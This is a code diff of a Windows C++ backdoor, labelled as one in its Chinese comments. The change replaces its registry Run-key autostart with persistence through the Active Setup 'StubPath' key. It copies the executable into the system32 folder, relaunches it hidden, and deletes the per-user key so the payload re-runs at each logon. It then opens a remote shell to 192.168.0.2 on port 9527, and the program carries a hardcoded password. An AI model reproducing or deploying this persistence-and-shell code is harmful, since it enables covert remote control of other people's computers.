@@ -8,6 +8,7 @@ BOOL bExit = FALSE;
 #define CMD_SHELL_FLAG _T("bd>cmdShell")
 #define LOGON_PASSWORD _T("123456")
 #define SEND_FLAG(m_sock, CMD_SHOW_FLAG) (SendData(m_sock, CMD_SHOW_FLAG, sizeof(CMD_SHOW_FLAG)))
+#define ACTIVE_X_REG _T("Software\\Microsoft\\Active Setup\\Installed Components\\{F839DE9E-B7CF-480b-9250-A844A36DD1A2}")
 
 BOOL SocketInit(){
 	WSADATA wsaData = { 0 };
@@ -307,6 +308,7 @@ __Error_End:
 	return bRet;
 }
 
+/*
 //使用从注册表自动启动的方式启动该后门程序
 BOOL AutoRunWithReg(){
 	BOOL bRet = TRUE;
@@ -331,18 +333,80 @@ __Error_End:
 	}
 	return bRet;
 }
+*/
 
+//拷贝该程序到系统文件路径: C:\windows\system32
+BOOL CopyToSysPath(LPTSTR lpszPath, UINT inLen){
+	BOOL bRet = FALSE;
+	TCHAR szPath[MAX_PATH]     = { 0 }, 
+		  szFileName[MAX_PATH] = { 0 };
+
+	GetModuleFileName(NULL, szPath, MAX_PATH);
+	UINT uLen = _tcslen(szPath);
+	for (int idx = uLen; idx >= 0; idx--) {
+		if (szPath[idx] == '\\') {
+			_tcsncpy_s(szFileName, MAX_PATH, szPath + idx, uLen - idx);
+			break;
+		}
+	}
+	GetSystemDirectory(lpszPath, inLen);
+	_tcscat_s(lpszPath, inLen, szFileName);
+	bRet = CopyFile(szPath, lpszPath, FALSE);
+	if (bRet) {
+		return TRUE;
+	}
+	else if (GetLastError() == ERROR_SHARING_VIOLATION){
+		return TRUE;
+	}
+	else{
+		return FALSE;
+	}
+}
+
+DWORD WINAPI RegWatchProc(LPVOID lpParam){
+	LONG lRet = ERROR_SUCCESS;
+	do {
+		Sleep(100);
+		lRet = RegDeleteKey(HKEY_CURRENT_USER, ACTIVE_X_REG);
+	} while (lRet == ERROR_FILE_NOT_FOUND);
+	return 0;
+}
+
+void AutoRunWithActiveX(LPCTSTR lpszCmdLine){
+	if (!lpszCmdLine) {//这行参数检查很重要,首次运行程序，参数长度为0
+		return;
+	}
+	if (_tcslen(lpszCmdLine) == 0) {
+		HKEY hLKey = NULL;
+		TCHAR szPath[MAX_PATH] = { 0 };
+
+		RegCreateKeyEx(HKEY_LOCAL_MACHINE, ACTIVE_X_REG, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hLKey, NULL);
+		CopyToSysPath(szPath, MAX_PATH);
+		RegSetValueEx(hLKey, _T("StubPath"), 0, REG_SZ, (BYTE *)szPath, sizeof(szPath));
+		RegCloseKey(hLKey);
+		ShellExecute(NULL, _T("open"), szPath, _T("exec"), NULL, SW_HIDE);//随便传递一个参数：_T("exec")，启动程序后，参数长度不为0
+	}
+	else{
+		CreateThread(NULL, 0, RegWatchProc, NULL, 0, NULL);
+		//
+		StartShell(9527, _T("192.168.0.2"));
+	}
+}
 ///////////////////////////////////////////////////////////////////
 int APIENTRY _tWinMain(HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
 	LPTSTR    lpCmdLine,
 	int       nCmdShow){
 
+	/*
 	if (AutoRunWithReg()){
 		MessageBox(NULL, _T("后门启动成功！"), _T("提示"), MB_OK);
 	}
+	*/
 
-	StartShell(3333, _T("192.168.0.100"));
+	//StartShell(3333, _T("192.168.0.100"));
+
+	AutoRunWithActiveX(lpCmdLine);
 
 	return 0;
 }
